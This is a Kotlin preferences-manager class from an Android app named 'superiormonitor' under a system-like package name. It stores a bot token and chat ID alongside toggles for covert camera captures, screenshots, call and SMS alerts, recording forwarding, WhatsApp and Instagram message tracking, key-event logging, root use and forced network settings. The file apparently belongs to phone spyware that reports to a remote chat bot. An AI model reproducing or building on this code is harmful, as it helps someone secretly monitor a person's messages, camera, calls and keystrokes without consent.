package com.system.superiormonitor.data

import android.content.Context
import android.content.SharedPreferences
import androidx.security.crypto.EncryptedSharedPreferences
import androidx.security.crypto.MasterKey

class PrefsManager private constructor(context: Context) {

    companion object {
        @Volatile
        private var instance: PrefsManager? = null

        fun getInstance(context: Context): PrefsManager {
            return instance ?: synchronized(this) {
                instance ?: PrefsManager(context.applicationContext).also { instance = it }
            }
        }
    }

    private val masterKey = MasterKey.Builder(context)
        .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
        .build()

    val sharedPreferences: SharedPreferences = EncryptedSharedPreferences.create(
        context,
        "secret_shared_prefs",
        masterKey,
        EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
        EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
    )

    private inner class StringPref(val key: String, val defaultValue: String = "") {
        private var cachedValue: String? = null
        operator fun getValue(thisRef: Any?, property: Any?): String {
            return cachedValue ?: sharedPreferences.getString(key, defaultValue).orEmpty().also { cachedValue = it }
        }
        operator fun setValue(thisRef: Any?, property: Any?, value: String) {
            cachedValue = value
            sharedPreferences.edit().putString(key, value).apply()
        }
    }

    private inner class BooleanPref(val key: String, val defaultValue: Boolean = false) {
        private var cachedValue: Boolean? = null
        operator fun getValue(thisRef: Any?, property: Any?): Boolean {
            return cachedValue ?: sharedPreferences.getBoolean(key, defaultValue).also { cachedValue = it }
        }
        operator fun setValue(thisRef: Any?, property: Any?, value: Boolean) {
            cachedValue = value
            sharedPreferences.edit().putBoolean(key, value).apply()
        }
    }

    private inner class IntPref(val key: String, val defaultValue: Int) {
        private var cachedValue: Int? = null
        operator fun getValue(thisRef: Any?, property: Any?): Int {
            return cachedValue ?: sharedPreferences.getInt(key, defaultValue).also { cachedValue = it }
        }
        operator fun setValue(thisRef: Any?, property: Any?, value: Int) {
            cachedValue = value
            sharedPreferences.edit().putInt(key, value).apply()
        }
    }

    private inner class LongPref(val key: String, val defaultValue: Long = 0L) {
        private var cachedValue: Long? = null
        operator fun getValue(thisRef: Any?, property: Any?): Long {
            return cachedValue ?: sharedPreferences.getLong(key, defaultValue).also { cachedValue = it }
        }
        operator fun setValue(thisRef: Any?, property: Any?, value: Long) {
            cachedValue = value
            sharedPreferences.edit().putLong(key, value).apply()
        }
    }

    var botToken by StringPref("bot_token")
    var chatId by StringPref("chat_id")
    var ownerUserId by StringPref("owner_user_id")
    
    var isServiceEnabled by BooleanPref("is_service_enabled")
    var isRootEnabled by BooleanPref("is_root_enabled")
    
    var forceMobileData by BooleanPref("force_mobile_data")
    var forceWifi by BooleanPref("force_wifi")
    var forceHotspot by BooleanPref("force_hotspot")
    var persistentEnforcementEnabled by BooleanPref("persistent_enforcement_enabled")
    
    var enableSnapshots by BooleanPref("enable_snapshots")
    var snapshotIntervalMin by IntPref("snapshot_interval_min", 15)
    
    var enableFrontCamera by BooleanPref("enable_front_camera")
    var frontCameraInterval by IntPref("front_camera_interval", 45)
    
    var enableRearCamera by BooleanPref("enable_rear_camera")
    var rearCameraInterval by IntPref("rear_camera_interval", 45)
    
    var whatsappUpdatesEnabled by BooleanPref("whatsapp_updates_enabled")
    var callAlertsEnabled by BooleanPref("call_alerts_enabled")
    var smsAlertsEnabled by BooleanPref("sms_alerts_enabled")
    var forwardRecordingEnabled by BooleanPref("forward_recording_enabled")
    
    var whatsappLastProcessedId by LongPref("whatsapp_last_processed_id", 0L)
    var callLastProcessedId by LongPref("call_last_processed_id", -1L)
    var smsLastProcessedOutgoingId by LongPref("sms_last_processed_outgoing_id", -1L)

    var instagramEnabled by BooleanPref("instagram_enabled", false)
    var instagramLastProcessedId by LongPref("instagram_last_processed_id", 0L)
    
    var whatsappBusinessUpdatesEnabled by BooleanPref("whatsapp_business_updates_enabled", false)
    var whatsappBusinessLastProcessedId by LongPref("whatsapp_business_last_processed_id", 0L)
    
    var keyEventsEnabled by BooleanPref("key_events_enabled", false)
    var keyEventsIntervalMin by IntPref("key_events_interval_min", 15)
}
